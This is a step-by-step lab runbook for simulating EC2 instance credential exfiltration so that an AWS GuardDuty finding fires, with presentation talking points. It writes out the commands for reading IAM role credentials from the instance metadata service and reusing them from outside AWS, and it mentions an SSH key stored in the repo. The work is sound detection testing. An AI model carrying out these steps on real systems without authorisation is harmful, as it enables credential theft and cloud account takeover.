# GuardDuty Attack Simulation
# EC2 Credential Exfiltration

This simulation triggers a real GuardDuty finding:
`UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS`

GuardDuty detects when EC2 instance credentials (from the IAM role) are used
from outside AWS infrastructure. This is one of the most valuable real-world
detections — it's how credential theft from a compromised EC2 gets caught.

**Risk: Zero.** You are making one read-only API call. Nothing is created or deleted.

---

## Step 1 — SSH into the EC2 instance

Run this from your terminal (the SSH key is in the repo):

```bash
ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237
```

---

## Step 2 — Steal the EC2 instance credentials

Once inside the EC2 shell, query the instance metadata service.
This is exactly what malware or an attacker would do after compromising the machine:

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/movie-buddy-ec2-role
```

You will get a JSON response like this:

```json
{
  "Code": "Success",
  "LastUpdated": "2026-06-19T...",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "abc123...",
  "Token": "IQoJb3...",
  "Expiration": "2026-06-19T..."
}
```

Copy the three values: `AccessKeyId`, `SecretAccessKey`, and `Token`.

---

## Step 3 — Exit the EC2 shell

```bash
exit
```

You are now back on your local machine (iMac). This is the critical part —
using EC2 credentials from outside AWS is what GuardDuty detects.

---

## Step 4 — Use the stolen credentials from your local machine

Replace the placeholders with the actual values from Step 2:

```bash
AWS_ACCESS_KEY_ID=ASIA_REPLACE_ME \
AWS_SECRET_ACCESS_KEY=REPLACE_ME \
AWS_SESSION_TOKEN=REPLACE_ME \
aws sts get-caller-identity --region us-east-1
```

You should see a response confirming you are acting as the EC2 role:

```json
{
  "UserId": "AROA...",
  "Account": "329153220664",
  "Arn": "arn:aws:sts::329153220664:assumed-role/movie-buddy-ec2-role/i-..."
}
```

This proves the credentials work outside AWS — exactly what an attacker would
verify after exfiltrating them.

---

## Step 5 — Wait for GuardDuty to fire

GuardDuty typically generates the finding within **15–30 minutes**.

Check here: AWS Console → GuardDuty → Findings

You are looking for a finding titled:
**UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration**
Severity: **High**

---

## What to say in the presentation

> "The EC2 instance has AdministratorAccess attached. The instance metadata
> service exposes temporary credentials to anyone who can reach it — including
> an attacker who just SSHed in through that open port 22. I grabbed those
> credentials from inside the machine, used them from my laptop outside AWS,
> and GuardDuty caught it within 30 minutes. This is exactly the detection
> that would alert a security team in a real breach scenario."

---

## Timing note

Run this simulation **at least 2 hours before the presentation** to ensure
the finding has appeared in GuardDuty before you go live.

Note: tested on 2026-06-20 — finding did not appear after ~1 hour in a
CloudLabs sandbox account. GuardDuty may have reduced detection coverage
in sandbox/lab accounts. Try again closer to presentation day; if it still
doesn't fire, the existing S3-related findings are sufficient for the demo.
